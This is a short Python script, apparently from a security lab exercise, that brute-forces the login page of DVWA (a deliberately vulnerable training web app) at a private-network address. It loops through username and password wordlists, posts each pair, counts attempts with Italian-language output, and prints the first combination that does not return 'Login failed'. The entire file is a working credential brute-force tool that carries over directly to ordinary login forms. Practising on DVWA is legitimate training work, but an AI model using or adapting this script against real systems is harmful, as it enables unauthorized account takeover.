import requests

url = "http://192.168.50.101/dvwa/login.php"

username_file = open("file/usernames.txt")
password_file = open("file/passwords.txt")

user_list = username_file.readlines()
pwd_list = password_file.readlines()

credentials = {
    "username":"",
    "password":"",
    "Login":"Login"
}

i = 0

stopit = False
for user in user_list:
    user =  user.rstrip()
    if(stopit): break
    for pwd in pwd_list:
        pwd = pwd.rstrip()
        if(stopit): break
        credentials["username"] = user
        credentials["password"] = pwd  
        req = requests.post(url, data = credentials)
        i+=1
        print(f"Combinazione N: {i}")

        if req.text.find("Login failed") == -1:
            print("Login success")
            print(f"{user} - {pwd}")
            stopit = True   
